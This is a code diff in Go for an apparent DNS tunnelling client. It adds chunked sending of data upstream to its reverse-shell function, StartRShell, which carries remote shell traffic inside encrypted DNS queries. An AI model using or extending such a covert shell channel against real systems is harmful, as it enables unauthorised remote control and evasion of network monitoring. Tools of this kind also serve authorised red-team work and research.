@@ -256,26 +256,15 @@ func (c *Client) StartRShell(pollInterval time.Duration) error {
 				shell.Wait()
 				return nil
 			}
-			frame, err := c.SendData(data)
+			downstream, _, err := c.SendDataChunked(data)
 			if err != nil {
 				log.Printf("rshell: send error: %v", err)
 				continue
 			}
-			if len(frame.Payload) > 0 {
-				shellIn.Write(frame.Payload)
+			if len(downstream) > 0 {
+				shellIn.Write(downstream)
 			}
 			idleCount = 0
-
-			// Drain any queued server data
-			for frame.Flags&protocol.FlagMoreData != 0 {
-				frame, err = c.Poll()
-				if err != nil {
-					break
-				}
-				if len(frame.Payload) > 0 {
-					shellIn.Write(frame.Payload)
-				}
-			}
 			continue
 
 		default:
@@ -316,7 +305,13 @@ func (c *Client) StartRShell(pollInterval time.Duration) error {
 	}
 }
 
-// SendData sends upstream data and returns the server's frame.
+// MaxUpstreamChunk returns the max bytes that can be sent in a single upstream DNS query.
+func (c *Client) MaxUpstreamChunk() int {
+	return c.qc.MaxPayload(c.clientID) - c.cipher.Overhead()
+}
+
+// SendData sends upstream data in a single DNS query.
+// Data must fit within MaxUpstreamChunk().
 func (c *Client) SendData(data []byte) (*protocol.Frame, error) {
 	encrypted, err := c.cipher.Encrypt(data)
 	if err != nil {
@@ -329,6 +324,49 @@ func (c *Client) SendData(data []byte) (*protocol.Frame, error) {
 		Payload: encrypted,
 	}
 	return c.sendPacket(pkt, c.clientID)
+}
+
+// SendDataChunked sends data in multiple DNS queries if needed,
+// collecting downstream responses along the way. Returns all
+// received downstream data and the last frame.
+func (c *Client) SendDataChunked(data []byte) (downstream []byte, lastFrame *protocol.Frame, err error) {
+	maxChunk := c.MaxUpstreamChunk()
+	if maxChunk <= 0 {
+		return nil, nil, fmt.Errorf("no space for upstream data")
+	}
+
+	for len(data) > 0 {
+		n := len(data)
+		if n > maxChunk {
+			n = maxChunk
+		}
+		chunk := data[:n]
+		data = data[n:]
+
+		frame, err := c.SendData(chunk)
+		if err != nil {
+			return downstream, nil, err
+		}
+
+		if len(frame.Payload) > 0 {
+			downstream = append(downstream, frame.Payload...)
+		}
+		lastFrame = frame
+
+		// Drain queued server data
+		for frame.Flags&protocol.FlagMoreData != 0 {
+			frame, err = c.Poll()
+			if err != nil {
+				break
+			}
+			if len(frame.Payload) > 0 {
+				downstream = append(downstream, frame.Payload...)
+			}
+			lastFrame = frame
+		}
+	}
+
+	return downstream, lastFrame, nil
 }
 
 // FetchFlags controls fetch behavior.
